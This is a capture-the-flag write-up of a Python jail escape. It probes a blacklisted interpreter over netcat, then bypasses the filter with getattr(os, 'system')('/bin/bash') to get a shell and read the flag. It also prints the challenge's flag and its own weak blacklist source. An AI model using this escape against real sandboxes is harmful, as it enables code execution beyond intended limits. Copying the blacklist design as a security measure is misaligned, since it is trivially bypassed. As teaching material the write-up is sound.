**Secure Pyshell - 100pts**

A friend of mine is die hard fan of python . He created a python interpreter of his own And claims to be very secure , prove him he is wrong. He loves Trump, btw. 
 nc 139.59.61.220 22345 


Rapidly we found that's we have a python3 interpreter : 

```BASH
 nc 139.59.61.220 22345 

Welcome to Secure Python Interpreter 
================================================

Rules:
    -Do not import anything
    -No peeking at files!
    -No sharing of flags :)


>>> print "1"
Error: print "1"
>>> print("1")
1
```

We can't use "." or simple quote ' and some basic fonctions are blacklisted :

```BASH
>>> quit
Do you think my code is so insecure ?
You can never get out of my jail :)
>>> eval
Do you think my code is so insecure ?
You can never get out of my jail :)
>>> print(__builtins__)
<module 'builtins' (built-in)>
>>> print(__builtins__.__class__)       
Do you think my code is so insecure ?
You can never get out of my jail :)
```

We found a interesting Jail fonction :

```BASH
>>> print(dir())
['Jail', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'a', 'cmd', 'execute', 'intro', 'os', 'sys']
```

But nothing to do with it...

```BASH
>>> print(Jail)
<class '__main__.Jail'>
>>> print(Jail())
<__main__.Jail object at 0x7ffff6280518>
>>> print(Jail(0))
<__main__.Jail object at 0x7ffff6280358>
>>> print(Jail(1))
<__main__.Jail object at 0x7ffff6280320>
```

Other interessant things : 'os' and 'sys' are imported !
We want to escape the jail so how can we exec a shell like /bin/bash ?
But we don't have the right to use "."
The trick here is to use the getattr function !
"getattr(object, name[, default])
Return the value of the named attribute of object.  name must be a string. If the string is the name of one of the object’s attributes, the result is the value of that attribute.  For example, getattr(x, 'foobar') is equivalent to x.foobar.  If the named attribute does not exist, default is returned if provided, otherwise AttributeError is raised."

```BASH
print(getattr(os, "system")("/bin/bash"))
id
uid=1003(pwn2) gid=1003(pwn2) groups=1003(pwn2)
cd /home/pwn2
ls -lsa
4 dr-xr-x---  2 root    pwn2    4096 Feb 25 14:20 .
4 drwxr-xr-x 12 root    root    4096 Feb 27 06:32 ..
4 ----r-----  1 root    pwn2      48 Feb 25 07:14 flag.txt
4 -rwxr-xr-x  1 skamath skamath 1386 Feb 25 14:20 pwn2

cat flag.txt
xiomara{$h3ll$_d0nT_l!3_wh3n_beat3n_uP_!n_j@!l}
```

For the fun, the script from this chall ;-) :

```BASH
cat pwn2
#!/usr/bin/python3
import sys, cmd, os

del __builtins__.__dict__['__import__']
del __builtins__.__dict__['eval']

intro = """
Welcome to Secure Python Interpreter 
================================================

Rules:
    -Do not import anything
    -No peeking at files!
    -No sharing of flags :)

"""


def execute(command):
       exec(command, globals())
 
class Jail(cmd.Cmd):
 
    prompt     = '>>> '
    filtered    = '\'|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back'.split('|')
 
    def do_EOF(self, line):
        sys.exit()
 
    def emptyline(self):
        return cmd.Cmd.emptyline(self)
 
    def default(self, line):
        sys.stdout.write('\x00')
 
    def postcmd(self, stop, line):
        if any(f in line for f in self.filtered):
            print("Do you think my code is so insecure ?")
            print("You can never get out of my jail :)")
        else:
           try:
                execute(line)
           except NameError:
                print("NameError: name '%s' is not defined" % line)
           except Exception:
                print("Error: %s" % line)
        return cmd.Cmd.postcmd(self, stop, line)
 
if __name__ == "__main__":
    try:
        Jail().cmdloop(intro)
    except KeyboardInterrupt:
        print("\rBye bye !")
```

By team Beers4Flags

```
 ________
|        |
|  #BFF  |
|________|
   _.._,_|,_
  (      |   )
   ]~,"-.-~~[
 .=] Beers ([
 | ])  4   ([
 '=]) Flags [
   |:: '    |
    ~~----~~
```
